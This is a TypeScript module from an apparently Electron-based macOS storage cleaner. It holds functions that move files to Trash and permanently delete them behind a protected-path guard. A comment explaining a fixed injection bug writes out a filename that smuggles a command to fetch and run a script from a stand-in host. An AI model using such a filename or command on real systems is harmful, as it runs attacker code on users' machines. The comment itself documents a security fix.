import fs from 'fs'
import path from 'path'
import { shell } from 'electron'
import { diskBytes, getDirSizeAsync } from './utils'
import { refuseReason } from './deleteGuard'

export interface FileOpResult {
  success: boolean
  errors: string[]
  freedBytes: number
  deletedPaths: string[]
}

async function getSize(p: string): Promise<number> {
  try {
    const stat = fs.statSync(p)
    // diskBytes for files, du -sk for dirs — both report allocated blocks, so a
    // sparse file never inflates freedBytes.
    if (stat.isFile()) return diskBytes(stat)
    return getDirSizeAsync(p)
  } catch {
    return 0
  }
}

/**
 * Move to Trash via the native API — no shell, so nothing to escape.
 *
 * This used to shell out to `osascript` with the path interpolated into a
 * single-quoted AppleScript string, escaping only `"`. A filename containing a single
 * quote closed the shell's quoting, so  a'$(curl evil.sh|sh)'b.txt  in ~/Downloads
 * executed as a command when cleaned. shell.trashItem hands the path to macOS as
 * data, is faster, and works when Finder isn't running.
 */
export async function moveToTrash(paths: string[]): Promise<FileOpResult> {
  const errors: string[] = []
  const deletedPaths: string[] = []
  let freedBytes = 0

  for (const p of paths) {
    const refused = refuseReason(p)
    if (refused) {
      errors.push(refused)
      continue
    }
    try {
      if (!fs.existsSync(p)) continue
      const size = await getSize(p)
      await shell.trashItem(p)
      freedBytes += size
      deletedPaths.push(p)
    } catch (err: any) {
      errors.push(`Failed to move ${path.basename(p)}: ${err.message}`)
    }
  }

  return { success: errors.length === 0, errors, freedBytes, deletedPaths }
}

/**
 * Permanent delete. Used for caches and other regenerable data, where routing through
 * Trash would leave the space occupied until the user empties it — the opposite of what
 * a storage cleaner is for — and for the explicit "Delete Permanently" action.
 *
 * Same protected-path guard as moveToTrash: this one has no undo at all.
 */
export async function deleteItems(paths: string[]): Promise<FileOpResult> {
  const errors: string[] = []
  const deletedPaths: string[] = []
  let freedBytes = 0

  for (const p of paths) {
    const refused = refuseReason(p)
    if (refused) {
      errors.push(refused)
      continue
    }
    try {
      if (!fs.existsSync(p)) continue
      const size = await getSize(p)
      const stat = fs.lstatSync(p)
      if (stat.isDirectory()) {
        fs.rmSync(p, { recursive: true, force: true })
      } else {
        fs.unlinkSync(p)
      }
      freedBytes += size
      deletedPaths.push(p)
    } catch (err: any) {
      errors.push(`Failed to delete ${path.basename(p)}: ${err.message}`)
    }
  }

  return { success: errors.length === 0, errors, freedBytes, deletedPaths }
}
